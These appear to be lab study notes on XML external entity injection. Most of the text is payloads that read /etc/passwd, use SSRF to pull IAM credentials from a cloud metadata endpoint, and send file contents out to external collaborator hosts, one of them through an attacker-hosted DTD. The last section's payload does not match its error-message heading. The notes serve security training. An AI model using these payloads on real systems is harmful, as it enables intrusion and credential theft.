	## Exploits



---

### lab1
#### Exploiting XXE to retrieve files
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>1</productId>
<storeId>1</storeId>
</stockCheck>
```

exploit
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY ext SYSTEM "file:///etc/passwd" > 
]>
<stockCheck><productId>&ext;</productId><storeId>1</storeId></stockCheck>
```

---
### lab2
#### perform SSRF attacks
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```

Exploit
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test[
	<!ENTITY ext SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck>
	<productId>&ext;</productId>
	<storeId>1</storeId>
</stockCheck>
```

---
### lab3 
#### perform blind out-of-band connection using normal external entity
```xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

exploit
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test[
	<!ENTITY xee SYSTEM "http://kbzrr0qbag4nz3ct6wakddsv2m8dw3ks.oastify.com">
]>
<stockCheck><productId>&xee;</productId><storeId>1</storeId></stockCheck>
```


---
### lab4
#### perform blind out-of-band connction using paramter externel entity
```xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
exploit
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test[
	<!ENTITY % ext SYSTEM "http://wyy3ecdnxsrzmfz5t8xw0pf7pyvpjh76.oastify.com"> 
	%ext; 
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

---
### lab5
#### Exploit out-of-band to exfiltrate data
```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
Normal Exploit
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test[
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % expand "<!ENTITY &#x25; ext SYSTEM 'http://wyy3ecdnxsrzmfz5t8xw0pf7pyvpjh76.oastify.com?x=%file;'>" >
	%expand;
	%ext;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
- We have to use multiple entities because Externel entities doesn't do expansion for other entities inside of it. so will use normal paramter entity first to fetch data then use external one to send it
	- use `expand` normal entity fetches `%files;`
	- use `ext` to send data.
- we have to encode `%` using XML encoding to `&#x25;` so it doesn't be understood as parameter in the first entity.

#### But the lab has '&' blocked so
```xml 
_____ in the request _____
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test[
	<!ENTITY % get SYSTEM "http://10.10.10.10/exploit">
	%get;
]>

_____ in my server _____ Changed content type to application/xml

	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % expand "<!ENTITY &#x25; ext SYSTEM 'http://wyy3ecdnxsrzmfz5t8xw0pf7pyvpjh76.oastify.com?x=%file;'>" >
	%expand;
	%ext;

```


---
### Exploiting blind XXE to retrieve data via error messages
```xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Exploit
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test[
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % expand "<!ENTITY &#x25; ext SYSTEM 'http://wyy3ecdnxsrzmfz5t8xw0pf7pyvpjh76.oastify.com?x=%file;'>" >
	%expand;
	%ext;
]>
```